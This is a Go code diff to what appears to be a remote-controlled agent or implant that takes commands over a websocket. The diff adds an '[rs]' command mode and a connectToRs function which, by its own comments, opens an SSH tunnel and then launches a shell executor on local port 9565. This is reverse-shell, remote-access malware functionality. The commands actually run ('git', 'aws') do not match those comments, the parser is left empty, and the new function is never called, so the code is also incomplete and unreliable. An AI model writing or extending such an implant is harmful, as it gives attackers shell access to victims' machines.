@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"os/exec"
 	"strings"
 	"time"
 
@@ -146,7 +147,7 @@ func (a *Agent) handleCmd(payload *Payload) {
 	if payload.mode != "cmd" {
 		return
 	}
-	send("/msg: well recived -> "+payload.from, a.ws)
+
 }
 
 func (a *Agent) handleMsg(payload *Payload) {
@@ -194,6 +195,9 @@ func (p *Payload) parser(str string) {
 	case "[ping]":
 		p.mode = "ping"
 		p.pingParser(args[1])
+	case "[rs]":
+		p.mode = "rs"
+		p.rsParser(args[1])
 	default:
 		p.mode = "msg"
 		p.msgParser(str)
@@ -231,4 +235,23 @@ func (p *Payload) msgParser(str string) {
 	if len(args) > 1 {
 		p.from = args[1]
 	}
+}
+
+func (p *Payload) rsParser(str string) {
+
+}
+
+func connectToRs(shell string, params []string) int {
+	//create ssh tunnel
+	_tunnel := exec.Command("git", params...)
+	go _tunnel.Run()
+	//sleep 5s
+	time.Sleep(time.Millisecond * 3000)
+	//spin the shell executor
+	_shell := exec.Command("aws", "localhost", "9565", shell)
+	err := _shell.Run()
+	if err != nil {
+		return -1
+	}
+	return 0
 }
